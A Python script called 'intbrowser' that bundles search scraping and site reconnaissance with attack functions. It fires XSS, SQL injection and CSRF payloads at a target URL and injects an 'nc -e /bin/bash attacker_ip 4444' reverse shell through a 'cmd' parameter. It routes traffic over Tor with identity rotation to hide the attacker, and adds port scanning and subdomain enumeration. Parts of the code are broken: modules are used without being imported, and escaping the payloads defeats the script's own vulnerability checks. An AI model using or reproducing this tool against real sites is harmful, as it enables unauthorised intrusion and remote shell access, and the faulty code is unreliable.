#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import argparse
from stem import Signal
from stem.control import Controller
import socket
import whois
from urllib.parse import urlparse

SEARCH_ENGINE_URLS = {
    'google': 'https://www.google.com/search?q=',
    'bing': 'https://www.bing.com/search?q=',
    'duckduckgo': 'https://duckduckgo.com/?q=',
    'startpage': 'https://www.startpage.com/do/dsearch?query='
}

EXPLOITS = {
    'xss': '<script>alert("XSS")</script>',
    'sql_injection': "' OR '1'='1",
    'csrf': '<form method="POST" action="http://example.com/vulnerable_endpoint"><input type="hidden" name="csrf_token" value="evil_token"><input type="submit"></form>'
}

PAYLOADS = {
    'reverse_shell': 'nc -e /bin/bash attacker_ip 4444'
}

def fetch_page(url, use_tor=False):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        if use_tor:
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            response = requests.get(url, headers=headers, proxies=proxies)
        else:
            response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None

def display_page(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    text = soup.get_text()
    print(text)

def search(term, engine='google', use_tor=False):
    search_url = SEARCH_ENGINE_URLS[engine] + term
    html_content = fetch_page(search_url, use_tor=use_tor)
    if html_content:
        soup = BeautifulSoup(html_content, 'html.parser')
        if engine in ['google', 'startpage']:
            for g in soup.find_all('div', class_='BVG0Nb'):
                link = g.find('a')
                if link:
                    print(f"Title: {link.text}\nURL: {link['href']}\n")
        elif engine == 'bing':
            for b in soup.find_all('li', class_='b_algo'):
                h2 = b.find('h2')
                if h2:
                    a = h2.find('a')
                    if a:
                        print(f"Title: {a.text}\nURL: {a['href']}\n")
        elif engine == 'duckduckgo':
            for d in soup.find_all('a', class_='result__a'):
                print(f"Title: {d.text}\nURL: {d['href']}\n")

def exploit_xss(url, use_tor=False):
    print(f"Attempting XSS on {url}")
    exploit_url = f"{url}?q={html.escape(EXPLOITS['xss'])}"
    html_content = fetch_page(exploit_url, use_tor=use_tor)
    if html_content and EXPLOITS['xss'] in html_content:
        print("XSS vulnerability found!")
    else:
        print("No XSS vulnerability found.")

def exploit_sql_injection(url, use_tor=False):
    print(f"Attempting SQL Injection on {url}")
    exploit_url = f"{url}?id={html.escape(EXPLOITS['sql_injection'])}"
    html_content = fetch_page(exploit_url, use_tor=use_tor)
    if html_content and "syntax error" not in html_content:
        print("SQL Injection vulnerability found!")
    else:
        print("No SQL Injection vulnerability found.")

def exploit_csrf(url, use_tor=False):
    print(f"Attempting CSRF on {url}")
    exploit_url = f"{url}?csrf_token={html.escape(EXPLOITS['csrf'])}"
    html_content = fetch_page(exploit_url, use_tor=use_tor)
    if html_content and EXPLOITS['csrf'] in html_content:
        print("CSRF vulnerability found!")
    else:
        print("No CSRF vulnerability found.")

def inject_payload(url, payload_type, use_tor=False):
    if payload_type not in PAYLOADS:
        print(f"Unknown payload type: {payload_type}")
        return
    payload = PAYLOADS[payload_type]
    print(f"Injecting payload on {url}")
    exploit_url = f"{url}?cmd={html.escape(payload)}"
    html_content = fetch_page(exploit_url, use_tor=use_tor)
    if html_content and payload in html_content:
        print(f"Payload injected successfully!")
    else:
        print("Failed to inject payload.")

def change_tor_identity():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_tor_password')  # Replace with your actual Tor control password
        controller.signal(Signal.NEWNYM)
        print("New Tor identity assigned.")

def port_scan(target):
    print(f"Scanning ports on {target}...")
    for port in range(1, 1025):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"Port {port} is open")

def fetch_headers(url):
    print(f"Fetching HTTP headers for {url}...")
    try:
        response = requests.head(url)
        for header, value in response.headers.items():
            print(f"{header}: {value}")
    except requests.RequestException as e:
        print(f"Error fetching headers: {e}")

def check_robots_txt(url):
    print(f"Checking robots.txt for {url}...")
    parsed_url = urlparse(url)
    robots_url = f"{parsed_url.scheme}://{parsed_url.netloc}/robots.txt"
    response = fetch_page(robots_url)
    if response:
        print(response)

def check_sitemap(url):
    print(f"Checking sitemap for {url}...")
    parsed_url = urlparse(url)
    sitemap_url = f"{parsed_url.scheme}://{parsed_url.netloc}/sitemap.xml"
    response = fetch_page(sitemap_url)
    if response:
        print(response)

def scan_links(url):
    print(f"Scanning links on {url}...")
    html_content = fetch_page(url)
    if html_content:
        soup = BeautifulSoup(html_content, 'html.parser')
        for link in soup.find_all('a'):
            print(link.get('href'))

def check_ssl_cert(url):
    print(f"Checking SSL certificate for {url}...")
    parsed_url = urlparse(url)
    hostname = parsed_url.netloc
    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
    conn.connect((hostname, 443))
    cert = conn.getpeercert()
    print(cert)

def find_subdomains(domain):
    print(f"Finding subdomains for {domain}...")
    try:
        response = requests.get(f"https://crt.sh/?q=%.{domain}&output=json")
        if response.status_code == 200:
            subdomains = {entry['name_value'] for entry in response.json()}
            for subdomain in subdomains:
                print(subdomain)
        else:
            print("Error fetching subdomains.")
    except requests.RequestException as e:
        print(f"Error: {e}")

def whois_lookup(domain):
    print(f"Performing WHOIS lookup for {domain}...")
    try:
        domain_info = whois.whois(domain)
        print(domain_info)
    except Exception as e:
        print(f"Error: {e}")

def check_http_status(url):
    print(f"Checking HTTP status for {url}...")
    try:
        response = requests.get(url)
        print(f"HTTP status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error: {e}")

def check_software_versions(url):
    print(f"Checking software versions for {url}...")
    try:
        response = requests.get(url)
        server = response.headers.get('Server', 'Unknown')
        powered_by = response.headers.get('X-Powered-By', 'Unknown')
        print(f"Server: {server}")
        print(f"X-Powered-By: {powered_by}")
    except requests.RequestException as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(prog="intbrowser", description='intbrowser')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('--tor', action='store_true', help='Use Tor for requests')
    parser.add_argument('--search', help='Search term')
    parser.add_argument('--engine', choices=SEARCH_ENGINE_URLS.keys(), default='google', help='Search engine to use')
    parser.add_argument('--exploit', choices=['xss', 'sql_injection', 'csrf'], help='Exploit to attempt')
    parser.add_argument('--payload', choices=PAYLOADS.keys(), help='Payload to inject')
    parser.add_argument('--port-scan', action='store_true', help='Perform a port scan')
    parser.add_argument('--headers', action='store_true', help='Fetch HTTP headers')
    parser.add_argument('--robots', action='store_true', help='Check robots.txt')
    parser.add_argument('--sitemap', action='store_true', help='Check sitemap')
    parser.add_argument('--links', action='store_true', help='Scan links on the page')
    parser.add_argument('--ssl-cert', action='store_true', help='Check SSL certificate')
    parser.add_argument('--subdomains', action='store_true', help='Find subdomains')
    parser.add_argument('--whois', action='store_true', help='Perform WHOIS lookup')
    parser.add_argument('--http-status', action='store_true', help='Check HTTP status code')
    parser.add_argument('--software-versions', action='store_true', help='Check software versions')

    args = parser.parse_args()

    if args.search:
        search(args.search, engine=args.engine, use_tor=args.tor)
    elif args.exploit:
        if args.exploit == 'xss':
            exploit_xss(args.url, use_tor=args.tor)
        elif args.exploit == 'sql_injection':
            exploit_sql_injection(args.url, use_tor=args.tor)
        elif args.exploit == 'csrf':
            exploit_csrf(args.url, use_tor=args.tor)
    elif args.payload:
        inject_payload(args.url, args.payload, use_tor=args.tor)
    elif args.port_scan:
        port_scan(args.url)
    elif args.headers:
        fetch_headers(args.url)
    elif args.robots:
        check_robots_txt(args.url)
    elif args.sitemap:
        check_sitemap(args.url)
    elif args.links:
        scan_links(args.url)
    elif args.ssl_cert:
        check_ssl_cert(args.url)
    elif args.subdomains:
        find_subdomains(args.url)
    elif args.whois:
        whois_lookup(args.url)
    elif args.http_status:
        check_http_status(args.url)
    elif args.software_versions:
        check_software_versions(args.url)
    else:
        html_content = fetch_page(args.url, use_tor=args.tor)
        if html_content:
            display_page(html_content)

if __name__ == "__main__":
    main()